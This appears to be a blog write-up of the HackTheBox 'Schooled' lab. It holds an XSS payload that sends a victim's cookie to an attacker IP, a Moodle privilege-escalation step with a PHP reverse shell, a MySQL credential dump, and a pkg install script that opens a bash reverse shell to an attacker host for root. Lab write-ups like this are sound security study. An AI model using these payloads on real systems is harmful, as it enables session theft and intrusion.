---
layout: post
current: post
navigation: True
title: Schooled Writeup
date: 2021-07-01 20:00:00
cover: assets/images/schooled_logo.png
class: post-template
subclass: 'post'
author: r3Z3l
---


Medium Linux box from HackTheBox.

On rustscan, There are 3 ports open 22,80,33060
we find that it's running as schooled.htb
let's do directory fuzzing and subdomain fuzzing.
![Pasted image 20210802221702.png](assets/images/Pasted image 20210802221702.png)
we found moodle.schooled.htb

we find that it maths professors verifying profile and we have XSS vulnerability in moodle profile.
we can try for maths professors document cookie.

``<script>var x = document.cookie; var y = 'http://10.10.16.26/'; fetch(y+x)</script>``

and running python server.
![Pasted image 20210802195032.png](assets/images/Pasted image 20210802195032.png)
we get cookie of Manuel Philips (Professors).
so let's edit our cookie and we are a teacher.

---
On googling we found that there is exploit to become manager from teacher.
we got a [script](https://github.com/HoangKien1020/CVE-2020-14321). but it's not working there's a manual process of becoming manager.
Recording: [here](https://vimeo.com/441698193)
Something that i changed:
- I use Lianne Carter profile for making him as manager.
- In block_rce i uploaded a php reverse shell

After Getting shell first i tried to stablize the shell using python but it couldn't find.
So, I thought less try to search python in system and i found it /usr/local/bin/python3.7

for finding database:
```
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
in file we found credentials of mysql.
```
/usr/local/bin/mysql -u moodle --password=PlaybookMaster2020 -e "use moodle; select email,username,password from mdl_user; exit"
```
and we got hashes.
![Pasted image 20210802235058.png](assets/images/Pasted image 20210802235058.png)
after using john we got password for admin and jamie.

We can ssh as jamie and got #user-txt .

On running ``sudo -l``
![Pasted image 20210802235342.png](assets/images/Pasted image 20210802235342.png)
we can run pkg without password as root.
on [Gftobin for pkg](https://gtfobins.github.io/gtfobins/pkg/) we found exploit.
let's create that pkg in our system
```
TF=$(mktemp -d)
echo 'bash -i >& /dev/tcp/10.10.16.24/4242 0>&1' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```
note: [fpm](https://fpm.readthedocs.io/en/latest/installing.html) should be installed in your system.
let's send to box.

```
sudo pkg install -y --no-repo-update ./x-1.0.txz
```
gives us reverse shell.
and we got #root-txt 

